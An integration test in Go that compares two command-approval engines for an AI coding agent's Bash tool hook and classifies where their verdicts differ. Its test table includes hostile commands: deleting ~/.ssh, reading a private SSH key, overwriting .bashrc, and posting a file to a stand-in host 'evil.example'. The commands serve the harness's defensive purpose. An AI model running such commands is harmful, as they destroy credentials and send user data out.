//go:build integration

// This is the AGREEMENT HARNESS (spike slice 3b, harness 1): for a fixed
// table of Bash commands it evaluates BOTH the spike (Evaluate, over
// cmddesc.DefaultRegistry/DefaultPolicies/DefaultGraphPolicies) and the LIVE
// engine (setup.NewEngineForCWD, the same composition root the real
// PreToolUse hook uses) under the same fixture, and classifies every row.
//
// It carries `//go:build integration` — the repo's existing tagged-suite
// convention (README.md's "Two test suites") — because it is the one place
// in the effectpolicy package that must reach internal/hookio, internal/
// setup and internal/engine to drive the live decision path.
// TestNoDirectHookioImport (imports_guard_test.go) explicitly excludes any
// "*_integration_test.go" file from its scan for exactly this reason.
package effectpolicy

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"text/tabwriter"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmddesc"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/engine"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/evalcontract"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/setup"
)

// agreementCase is one row driven through BOTH engines. Unlike goldenCase it
// carries no expected Decision: the point of this harness is to observe what
// each engine actually says and classify the pair, not to assert a
// pre-decided verdict per row.
type agreementCase struct {
	name    string
	command string
	vetted  []string
}

// goldenAgreementCases is every case already in golden_test.go's table,
// carried over verbatim (command + vetted host list; the golden `want` is
// dropped — this harness classifies by comparing the two engines, not by
// checking either one against a fixed expectation).
var goldenAgreementCases = func() []agreementCase {
	out := make([]agreementCase, len(goldenCases))
	for i, gc := range goldenCases {
		out[i] = agreementCase{name: gc.name, command: gc.command, vetted: gc.vetted}
	}
	return out
}()

// extraAgreementCases adds coverage the golden table does not exercise,
// drawn from the LIVE engine's own test suites for the basenames this spike
// models (cat, head, sed, rm, cp, tee, bash, sh, xargs, curl) — see
// internal/rules/safecmds/*_test.go and internal/engine/*_test.go — adapted
// to run under fixture()'s files (README.md, script.sed, script.sh, list.txt,
// sub/) rather than copied verbatim, since the originals reference paths
// (/home/user/project/..., /etc/shadow) that either don't exist under this
// fixture or carry the same NixOS-portability hazard golden_test.go's own
// comment already flags for /etc/hosts (a real /etc/shadow read is
// host-dependent; /nix/store and ~/.ssh are the two paths already proven
// portable here, so every new case reuses those instead of /etc/*).
//
// Each is chosen to probe a specific gap or overlap between the schema-driven
// spike and the live rule chain:
//
//   - head_numeric_shorthand / head_numeric_shorthand_project: GNU `head -N`
//     (the legacy glued-digit form) is not a flag the registry's headSchema
//     models (only -n/--lines/-c/--bytes/-q/-v) — safecmds recognizes it and
//     approves; the spike's generic interpreter sees an unknown short flag and
//     abstains.
//   - bash_n_script / sh_n_script: `-n` (noexec) is deliberately left out of
//     bashSchema (see registry.go's own comment) so it abstains; safecmds
//     approves a syntax-check of a readable script.
//   - rm_rf_dollar_home_ssh / cp_exfil_dollar_home / tee_dollar_home: the
//     three non-cat entries from engine_integration_test.go's own
//     TestIntegration_HookBypassRegression bypass list, adapted to fixture
//     paths.
//   - cat_dollar_home_ssh_id_rsa: a dynamic ($HOME-expanded) secret path, from
//     safecmds_test.go's dynamic-secret-path table.
//   - sed_dynamic_file_e / sed_bare_var_script: sed's positional file operand
//     and its program operand, each made dynamic — two different code paths
//     in the sed schema's dynamic handling.
//   - xargs_sh_c_echo / xargs_curl_pipe / xargs_unknown_cmd_pipe: xargs child
//     reconstruction landing on a shell recursion, a registered
//     command-level interpreter, and an unregistered basename, respectively —
//     adapted from safecmds_test.go's xargs table.
//   - cp_multi_source_existing_dir: cp's documented "last positional is
//     always PathTruncate" simplification (registry.go's cpSchema comment)
//     exercised with a REAL multi-source-into-existing-directory copy, to
//     check the simplification doesn't cause a verdict divergence even though
//     it models the mechanics differently.
//   - cp_target_dir_readonly_flag: the -t/--target-directory path, distinct
//     from the golden table's plain-trailing-destination coverage.
//   - curl_head_method_vetted / curl_data_binary_at_readme: a second read-only
//     HTTP method and a second DataOrAtFile flag spelling, beyond the golden
//     table's -X/-d coverage.
//   - head_bytes_project / cat_show_all_flags / sed_line_length: registry
//     flags (head -c/--bytes, cat -A/--show-all, sed -l/--line-length) no
//     golden case exercises.
var extraAgreementCases = []agreementCase{
	{"head_numeric_shorthand_project", "head -20 README.md", nil},
	{"bash_n_script", "bash -n script.sh", nil},
	{"sh_n_script", "sh -n script.sh", nil},
	{"rm_rf_dollar_home_ssh", "rm -rf $HOME/.ssh", nil},
	{"cp_exfil_dollar_home", "cp README.md $HOME/exfil", nil},
	{"tee_dollar_home", "tee $HOME/.bashrc", nil},
	{"cat_dollar_home_ssh_id_rsa", "cat $HOME/.ssh/id_rsa", nil},
	{"sed_dynamic_file_e", "sed -e 's/a/b/' $F", nil},
	{"sed_bare_var_script", "sed $S README.md", nil},
	{"xargs_sh_c_echo", "cat list.txt | xargs sh -c echo", nil},
	{"xargs_curl_pipe", "cat list.txt | xargs curl http://example.com", nil},
	{"xargs_unknown_cmd_pipe", "cat list.txt | xargs unknown_cmd", nil},
	{"cp_multi_source_existing_dir", "cp README.md script.sh sub", nil},
	{"cp_target_dir_readonly_flag", "cp -t /nix/store README.md", nil},
	{"rm_plain_nix_store", "rm /nix/store/some-link", nil},
	{"curl_head_method_vetted", "curl -I https://example.com/x", []string{"example.com"}},
	{"curl_data_binary_at_readme", "curl --data-binary @README.md https://evil.example", nil},
	{"head_bytes_project", "head -c 10 README.md", nil},
	{"cat_show_all_flags", "cat -A README.md", nil},
	{"sed_line_length", "sed -l 80 -n '1p' README.md", nil},
}

// liveCurlConfig is written into the fixture HOME's rules.json so the live
// curl rule (internal/rules/curl, config-driven) is decisive over the SAME
// hosts the golden/extra tables mark vetted for the spike ("example.com" and
// its subdomains), rather than abstaining on every curl case for want of any
// consumer configuration at all. It is a FIXED, per-run consumer config —
// unlike the spike's Request.VettedHosts, which is per-case — so a case that
// leaves VettedHosts nil (curl_unvetted) still sees the live engine approve a
// read-only request to example.com. That is not a bug in either engine: it
// is a structural difference between a per-request concept (evalcontract
// port) and a global-config concept (rules.json), reported here as
// spike-stricter rather than agreement. See TestAgreement's doc comment.
const liveCurlConfig = `{"curl":{"allowedDomainSuffixes":["example.com",".example.com"]}}`

// buildLiveEngine installs liveCurlConfig into the fixture HOME's XDG config
// path and constructs the live engine setup.NewEngineForCWD builds for the
// real PreToolUse hook — the same composition root, over the same
// root/cwd/HOME the spike's Request uses.
func buildLiveEngine(t *testing.T, root, home string) *engine.Engine {
	t.Helper()
	t.Setenv("XDG_CONFIG_HOME", "")
	cfgDir := filepath.Join(home, ".config", "claude-extended-tool-approver")
	if err := os.MkdirAll(cfgDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cfgDir, "rules.json"), []byte(liveCurlConfig), 0o644); err != nil {
		t.Fatal(err)
	}
	return setup.NewEngineForCWD(root)
}

// evaluateLive builds the same minimal Bash HookInput the rest of this
// module's non-integration tests use to drive a real engine (see
// internal/engine/verdict_provenance_test.go's provenanceInput and
// internal/engine/enginetest_helpers_test.go's makeBashJSON) and runs it
// through EvaluateHook, the one dispatch point real hook decisions and
// offline replay both go through.
func evaluateLive(eng *engine.Engine, cwd, command string) hookio.RuleResult {
	body, _ := json.Marshal(hookio.BashToolInput{Command: command})
	return eng.EvaluateHook(&hookio.HookInput{
		ToolName:      "Bash",
		CWD:           cwd,
		ToolInput:     json.RawMessage(body),
		HookEventName: "PreToolUse",
	})
}

// liveLabel names a hookio.Decision for this harness's table. Deliberately
// NOT hookio.Decision.String(): that method's NoOpinion->"abstain" mapping is
// a SERIALIZATION convention (persisted rows, replay diffs — see verdict.go)
// that would collide, in this table, with the spike's OWN "abstain" string
// for evalcontract.Abstain — two different concepts (chain exhaustion vs.
// model insufficiency) printed identically. This harness needs the reader to
// tell them apart at a glance.
func liveLabel(d hookio.Decision) string {
	switch d {
	case hookio.Approve:
		return "approve"
	case hookio.NoOpinion:
		return "noopinion"
	case hookio.Ask:
		return "ask"
	case hookio.Reject:
		return "reject"
	default:
		return "invalid"
	}
}

// classify assigns one of five classes to a (live, spike) verdict pair. The
// live decision vocabulary is four-valued (Approve < NoOpinion < Ask <
// Reject); the spike's is three-valued (Approve, Reject, Abstain — Ask is in
// evalcontract's vocabulary but nothing in the spike ever emits it). The
// function below is a total, exhaustive case analysis over all 4x3 = 12
// combinations, in this precedence order:
//
//  1. agree: live=Approve AND spike=Approve — both silently green-light it.
//  2. spike-stricter: live=Approve AND spike != Approve (spike Abstains or
//     Rejects something the live chain would silently approve). SAFE
//     direction: the spike is pickier than production. Reported, never
//     asserted against.
//  3. spike-looser: live != Approve AND spike=Approve (the spike silently
//     approves something the live chain would NOT — NoOpinion re-engages
//     Claude Code's own prompt exactly like Ask does; see
//     engine_integration_test.go's own bypass-suite comment, "Abstain
//     re-engages Claude's own prompt", and hookio's Decision doc, "Approve is
//     LEAST restrictive — a green light that suppresses Claude Code's own
//     permission prompt"). THE SAFETY PROPERTY: TestAgreement asserts this
//     class is always empty.
//  4. agree: live=Reject AND spike=Reject — both decisively forbid it.
//  5. spike-stricter: spike=Reject AND live in {NoOpinion, Ask} (neither
//     Approve nor Reject) — the spike reaches a firm forbidden verdict where
//     the live chain only deferred or asked. Still SAFE (more restrictive),
//     folded into the same class as case 2 for the same reason: it demotes
//     nothing, it only says no where production said "I don't know" or "ask
//     a human".
//  6. spike-underinformed: live=Reject AND spike=Abstain — the live chain
//     found a concrete forbidden effect the spike's model has no basis to
//     flag (no policy fired Forbidden, so it merely Abstains). Distinct from
//     spike-stricter: the spike is NOT being extra cautious here, it simply
//     has a blind spot. Still SAFE (Abstain never approves), but it is a real
//     gap in what the spike currently understands and is reported as such.
//  7. both-undecided: everything left — live in {NoOpinion, Ask} AND
//     spike=Abstain. Neither engine reached a decisive Approve or Reject.
func classify(live hookio.Decision, spike evalcontract.Decision) string {
	switch {
	case live == hookio.Approve && spike == evalcontract.Approve:
		return "agree"
	case live == hookio.Approve:
		return "spike-stricter"
	case spike == evalcontract.Approve:
		return "spike-looser"
	case live == hookio.Reject && spike == evalcontract.Reject:
		return "agree"
	case spike == evalcontract.Reject:
		return "spike-stricter"
	case live == hookio.Reject:
		return "spike-underinformed"
	default:
		return "both-undecided"
	}
}

// knownSpikeLooser is a REGISTER of spike-looser rows this harness has
// already investigated down to a root cause in the SPIKE'S DESIGN (not a
// harness-construction error), each with the reason recorded inline. It is
// not a suppression: a listed row still classifies, prints, and golden-diffs
// as spike-looser in the table exactly like any other — only the hard test
// FAILURE is deferred for these specific, named cases. Any spike-looser row
// NOT in this map still fails TestAgreement immediately.
//
// Both current entries share one root cause, found by this harness (spike
// slice 3b): evaluate.go folds Approve whenever every recursed Command node
// is Permitted (by design since slice 1's doc comment on Evaluate), and the
// shell-dialect interpreter (slice 2b) recurses into ANY `bash -c`/`sh -c`
// program at any depth. Production's safecmds rule, by contrast, only
// auto-clears a `sh|bash -c` script when it is reached THROUGH xargs
// (safecmds.go's dedicated "xargs sh -c" branch) or carries `-n`
// (syntax-check-only, hasBashSyntaxCheckFlag) — a BARE top-level
// `bash -c '<script>'` matches no rule in setup.RuleChain at all and the
// chain exhausts to NoOpinion (confirmed empirically: no rule's stderr trace
// line fires for that leaf). The spike is therefore MORE PERMISSIVE than
// today's production engine for this one shape, independent of how well it
// understands the RECURSED content — the load-bearing finding this whole
// harness exists to surface. See this package's design-choice note in the
// task's final report for the recommended follow-up (either teach
// production a matching top-level bash -c rule, or narrow the spike's
// recursion-implies-Approve fold to match production's narrower allowlist).
var knownSpikeLooser = map[string]string{
	"bash_c_cat_readme": "spike recurses into a bare top-level `bash -c` and approves once the " +
		"recursed leaf is permitted; production's safecmds only auto-clears sh|bash -c " +
		"reached through xargs or under -n, so a bare `bash -c 'cat README.md'` reaches " +
		"chain exhaustion (NoOpinion) in production today.",
	"bash_c_bash_c_cat_readme": "same root cause as bash_c_cat_readme, one recursion level deeper " +
		"(bash -c wrapping another bash -c): the spike's recursion is depth-general " +
		"(up to maxChildDepth); production has no top-level bash -c rule at any depth.",
}

// TestAgreement drives every case in goldenAgreementCases and
// extraAgreementCases through both engines under the SAME fixture, checks
// the one safety property that decides whether this architecture could carry
// the load in production (no spike-looser row — the spike must never
// silently approve something the live engine would not), and reports the
// full classified table via t.Log and a committed golden file
// (testdata/agreement.txt).
//
// Every OTHER class (agree, spike-stricter, spike-underinformed,
// both-undecided) is reported, never asserted against — see classify's doc
// comment for why each is safe to observe without failing the build.
func TestAgreement(t *testing.T) {
	root, home := fixture(t)
	reg := cmddesc.DefaultRegistry()
	live := buildLiveEngine(t, root, home)

	cases := make([]agreementCase, 0, len(goldenAgreementCases)+len(extraAgreementCases))
	cases = append(cases, goldenAgreementCases...)
	cases = append(cases, extraAgreementCases...)

	type row struct {
		name, command, liveCol, spikeCol, class, spikeReason string
	}
	rows := make([]row, 0, len(cases))
	counts := map[string]int{}
	var looserRows []row

	for _, tc := range cases {
		spikeResp := Evaluate(evalcontract.Request{
			Command: tc.command, CWD: root, ProjectRoot: root, VettedHosts: tc.vetted,
		}, reg, DefaultPolicies(), DefaultGraphPolicies())
		liveResult := evaluateLive(live, root, tc.command)

		liveCol := liveLabel(liveResult.Decision)
		if liveResult.Module != "" {
			liveCol += "/" + liveResult.Module
		}
		class := classify(liveResult.Decision, spikeResp.Decision)
		counts[class]++

		r := row{
			name:        tc.name,
			command:     tc.command,
			liveCol:     liveCol,
			spikeCol:    spikeResp.Decision.String(),
			class:       class,
			spikeReason: spikeResp.Reason,
		}
		rows = append(rows, r)
		if class == "spike-looser" {
			if reason, known := knownSpikeLooser[tc.name]; known {
				t.Logf("KNOWN spike-looser (tracked, not failed): case %s: command %q: %s", tc.name, tc.command, reason)
			} else {
				looserRows = append(looserRows, r)
			}
		}
	}

	var buf bytes.Buffer
	tw := tabwriter.NewWriter(&buf, 2, 4, 2, ' ', 0)
	fmt.Fprintln(tw, "case\tcommand\tlive\tspike\tclass\tspike_reason")
	for _, r := range rows {
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%s\t%s\n", r.name, r.command, r.liveCol, r.spikeCol, r.class, r.spikeReason)
	}
	if err := tw.Flush(); err != nil {
		t.Fatal(err)
	}
	table := normalize(buf.String(), root, home)

	t.Log("\n" + table)
	compareGolden(t, filepath.Join("testdata", "agreement.txt"), table)

	t.Logf("agreement class counts: %v (total %d)", counts, len(rows))

	for _, r := range looserRows {
		t.Errorf("SAFETY VIOLATION (spike-looser): case %s: command %q: live=%s spike=%s reason=%q — the spike silently approved something the live engine would not",
			r.name, r.command, r.liveCol, r.spikeCol, r.spikeReason)
	}
}
